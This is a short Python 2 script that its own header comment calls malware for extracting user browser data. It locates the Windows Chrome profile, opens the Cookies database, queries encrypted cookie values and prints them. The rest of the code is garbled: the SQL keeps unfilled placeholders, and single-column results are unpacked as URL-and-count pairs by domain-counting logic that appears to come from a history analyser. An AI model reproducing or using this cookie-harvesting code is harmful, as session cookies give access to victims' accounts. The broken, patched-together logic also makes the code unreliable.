# a malware to extract user browser data.
import os
import sqlite3
import operator
import matplotlib.pyplot as plt
from collections import OrderedDict
from pyfiglet import Figlet


f = Figlet(font='slant')
print f.renderText('PLATH')


def parse(url):
    try:
        parsed_url_components = url.split('//')
        sublevel_split = parsed_url_components[1].split('/',1)
        domain = sublevel_split[0].replace("www.","")
        return domain
    except IndexError:
        print "URL format Error"

def analyze(results):

	prompt = raw_input("[.] Type <c> to obtain results  ")

	if prompt == "c":
		for site, count in sites_count_sorted.items():
			print site, count

pathd = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
filed = os.listdir(pathd)
hist_db = os.path.join(pathd, 'Cookies')

c = sqlite3.connect(hist_db)
curs = c.cursor()
select_statement = "SELECT encrypted_value FROM cookies WHERE name='$valueName' AND host_key='$hostKey' ORDER BY creation_utc DESC LIMIT 1;"
curs.execute(select_statement)

results = curs.fetchall()
print(results)

sites_count = {}
for url, count in results:
    url = parse(url)
    if url in sites_count:
        sites_count[url]+=1
    else:
        sites_count[url]=1

sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))

analyze(sites_count_sorted)
